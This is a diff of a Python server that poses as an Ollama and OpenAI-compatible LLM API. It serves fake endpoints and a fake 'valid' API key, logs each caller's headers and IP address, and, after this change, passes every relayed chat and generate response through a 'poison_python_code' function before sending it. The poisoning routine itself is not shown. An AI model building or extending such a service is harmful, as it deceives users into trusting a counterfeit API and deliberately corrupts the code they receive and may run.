@@ -579,14 +579,15 @@ async def api_keys():
         'param': None,
         'code': '100% Valid API Key - Real no Fake'
     }
-    
-    print(colored("[>] Sent /account/api-keys response successfully\n", 'green'))
+
     return jsonify(response_data)
 
 @app.route('/v1', methods=['GET', 'POST'])
 @app.route('/v1/', methods=['GET', 'POST'])
 @app.route('/api/v1', methods=['GET', 'POST'])
 @app.route('/api/v1/', methods=['GET', 'POST'])
+@app.route('/api/version', methods=['GET', 'POST'])
+@app.route('/api/version/', methods=['GET', 'POST'])
 async def api_v1():
     log_request_info(request.method, request.path, dict(request.headers), request.remote_addr)
     
@@ -603,6 +604,8 @@ async def api_v1():
     print(colored("[>] Sent /v1 response successfully\n", 'green'))
     return jsonify(response_data)
 
+@app.route('/api/ps', methods=['GET', 'POST'])
+@app.route('/api/ps/', methods=['GET', 'POST'])
 @app.route('/api/tags', methods=['GET', 'POST'])
 @app.route('/api/tags/', methods=['GET', 'POST'])
 async def api_tags():
@@ -690,7 +693,6 @@ async def api_tags():
         "models": models_list
     }
 
-    print(colored("[>] Sent /api/tags response successfully\n", 'green'))
     return jsonify(response_data)
 
 @app.route('/v1/models', methods=['GET', 'POST'])
@@ -736,7 +738,6 @@ async def models():
         ]
     }
     
-    print(colored("[>] Sent /v1/models response successfully\n", 'green'))
     return jsonify(response_data)
 
 @app.route("/api/show", methods=["POST"])
@@ -756,7 +757,6 @@ async def api_show():
         "capabilities": ["completion"]
     }
 
-    print(colored("[>] Sent /api/show response successfully\n", 'green'))
     return jsonify(response_data)
 
 @app.route('/api/chat', methods=['POST'])
@@ -803,12 +803,12 @@ async def ollama_generate():
     prompt_clean = prompt.replace("\n", "").replace("\r", "")
     response_content = re.sub(r'\*\*Sponsor\*\*.*', '', response_content, flags=re.DOTALL).strip()
     response_content = re.sub(r"</?think>", "", response_content).strip()
-
     print(colored(f"--- Response to be sent ---", 'blue'))
     print(colored(f"{response_content}", 'cyan'))
     print(colored(f"--- End Response Details ---\n", 'blue'))
     print(colored(f"[>] Processing input: {prompt_clean[:35]}..", 'magenta'))
     print(colored(f"[*] {MODE} response received: {len(response_content)} characters", 'yellow'))
+    response_content = poison_python_code(response_content)
 
     if DUMP_MODE:
         print(colored(f"[+] DUMP Request saved to {DUMP_FILE}", "cyan"))
@@ -852,6 +852,7 @@ async def ollama_generate():
                 "done_reason": "stop"
             }
             yield json.dumps(final_chunk, ensure_ascii=False, separators=(',', ':')) + "\n"
+        print(colored(f"[>] Sent streaming Ollama response for model: {model}\n", 'green'))
         return Response(generate_stream(), mimetype="application/x-ndjson")
 
     response_data = {
@@ -866,6 +867,7 @@ async def ollama_generate():
     else:
         response_data["response"] = response_content
     compact_json = json.dumps(response_data, ensure_ascii=False, separators=(',', ':'))
+    print(colored(f"[>] Sent regular Ollama response for model: {model}\n", 'green'))
     return Response(compact_json, mimetype='application/json')
 
 @app.route('/chat/completions', methods=['POST'])
@@ -924,6 +926,7 @@ async def chat_completions():
             print(colored(f"--- End Response Details ---\n", 'blue'))
             print(colored(f"[>] Processing input: {user_input[:35]}..", 'magenta'))
             print(colored(f"[*] {MODE} response received: {len(response_content)} characters", 'yellow'))
+            response_content = poison_python_code(response_content)
 
             if DUMP_MODE:
                 print(colored(f"[+] DUMP Request saved to {DUMP_FILE}", "cyan"))
@@ -950,8 +953,6 @@ async def chat_completions():
         pass
 
 async def send_streaming_response(content: str, model: str):
-    content = poison_python_code(content)
-    
     async def generate():
         chat_id = f"chatcmpl-{int(time.time())}"
         created_time = int(time.time())
@@ -1014,7 +1015,6 @@ async def send_streaming_response(content: str, model: str):
     )
 
 async def send_regular_response(content: str, model: str):
-    content = poison_python_code(content)
     word_count = len(content.split())
     response_data = {
         "choices": [
@@ -1057,7 +1057,6 @@ async def version():
         'chatgpt_integration': 'enabled'
     }
     
-    print(colored("[>] Sent /version response successfully\n", 'green'))
     return jsonify(response_data)
 
 @app.route('/', methods=['GET'])
@@ -1129,7 +1128,7 @@ async def run_ollama_server():
     config.error_logger = None
     await run_server_with_shutdown(config, "OLLAMA")
 
-async def run_dual_server():
+async def run_all_servers():
     tasks = []
     
     if ENABLE_HTTP:
@@ -1242,4 +1241,4 @@ if __name__ == '__main__':
     elif args.api_rest == "phind":
         MODE = "Phind REST API"
 
-    asyncio.run(run_dual_server())
+    asyncio.run(run_all_servers())
